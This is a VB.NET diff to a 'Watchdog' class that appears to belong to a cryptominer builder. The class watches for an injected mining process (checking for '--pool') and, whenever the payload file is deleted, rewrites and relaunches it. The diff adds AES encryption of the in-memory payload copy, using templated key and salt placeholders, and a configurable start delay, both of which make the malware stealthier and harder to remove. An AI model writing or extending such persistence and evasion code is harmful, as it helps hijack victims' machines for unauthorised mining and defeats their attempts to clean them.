@@ -10,8 +10,8 @@ Imports System.Runtime.InteropServices
 Imports System.Collections.Generic
 Imports System.Drawing
 Imports System.Windows.Forms
-Imports System.Net
 Imports System.IO
+Imports System.Net
 Imports System.Drawing.Drawing2D
 Imports System.Drawing.Imaging
 Imports System.Threading
@@ -33,7 +33,7 @@ Public Class Watchdog
     Public Shared Sub Main()
         Try
             plp = PayloadPath
-            xm = System.IO.File.ReadAllBytes(plp)
+            xm = AES_Encryptor(System.IO.File.ReadAllBytes(plp))
 
             WDLoop()
 
@@ -46,7 +46,7 @@ Public Class Watchdog
         Try
             If Not CheckProc(GetString("#InjectionTarget"), "--pool") Then
                 If Not System.IO.File.Exists(plp) Then
-                    System.IO.File.WriteAllBytes(plp, xm)
+                    System.IO.File.WriteAllBytes(plp, AES_Decryptor(xm))
                     Process.Start(plp)
                 Else
                     If checkcount < 2 Then
@@ -59,12 +59,17 @@ Public Class Watchdog
             Else
                 checkcount = 0
                 If Not System.IO.File.Exists(plp) Then
-                    System.IO.File.WriteAllBytes(plp, xm)
+                    System.IO.File.WriteAllBytes(plp, AES_Decryptor(xm))
                     Process.Start(plp)
                 End If
             End If
 
-            System.Threading.Thread.Sleep(10000)
+            If IsNumeric("#STARTDELAY") AndAlso CInt("#STARTDELAY") > 0 Then
+                System.Threading.Thread.Sleep(CInt("#STARTDELAY") * 1000 + 5000)
+            Else
+                System.Threading.Thread.Sleep(10000)
+            End If
+
             WDLoop()
         Catch ex As Exception
         End Try
@@ -110,4 +115,22 @@ Public Class Watchdog
             Return mStream.ToArray()
         End Using
     End Function
+
+    Public Shared Function AES_Encryptor(ByVal input As Byte()) As Byte()
+        Dim initVectorBytes As Byte() = Encoding.ASCII.GetBytes("#IV")
+        Dim saltValueBytes As Byte() = Encoding.ASCII.GetBytes("#SALT")
+        Dim k1 As New Rfc2898DeriveBytes("#KEY", saltValueBytes, 100)
+        Dim symmetricKey As New RijndaelManaged
+        symmetricKey.KeySize = 256
+        symmetricKey.Mode = CipherMode.CBC
+        Dim encryptor As ICryptoTransform = symmetricKey.CreateEncryptor(k1.GetBytes(16), initVectorBytes)
+        Using mStream As New MemoryStream()
+            Using cStream As New CryptoStream(mStream, encryptor, CryptoStreamMode.Write)
+                cStream.Write(input, 0, input.Length)
+                cStream.Close()
+            End Using
+            Return mStream.ToArray()
+        End Using
+    End Function
+
 End Class
